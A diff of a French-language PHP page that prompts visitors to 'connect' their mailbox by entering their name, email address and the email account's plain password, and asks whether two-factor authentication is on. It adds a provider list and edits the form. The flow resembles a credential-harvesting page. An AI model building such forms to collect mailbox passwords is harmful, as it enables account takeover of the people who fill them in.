@@ -10,6 +10,7 @@
     session_start();
     if(!isset($_REQUEST["email"])){
        echo" <h2>Connectez votre boîte mail</h2>
+       <p>Les emails supportés sont: Gmail, Outlook, Hotmail, Yahoo, Bluewin, Orange, Free et SFR</p>
        <form method='post'>
            <div><input type='text' placeholder='Prénom' name='fname' id='fname' required>
            <input type='text' placeholder='Nom' name='lname' id='lname' required>
@@ -68,13 +69,13 @@
                 
             break;
         
-            case "icloud":
+          /*  case "icloud":
                 echo "<a href='#'>J'ai activé la double auth</a>
                 <a href='#'>Je n'ai pas activé la double auth</a>";
                 
-            break;
+            break;*/
             case "simple":
-                echo "<br><form method='post'><label for='password'>Mot de passe de votre email :</label><br><input type='password' name='password' placeholder='Mot de passe' required><button class='btn btn_small' type='submit'>Submit</button></form>";
+                echo "<form method='post'><h2>Mot de passe de votre email :</h2><br><input type='password' name='password' placeholder='Mot de passe' required><button class='btn btn_small' type='submit'>Se connecter</button></form>";
             break;
             
             default:
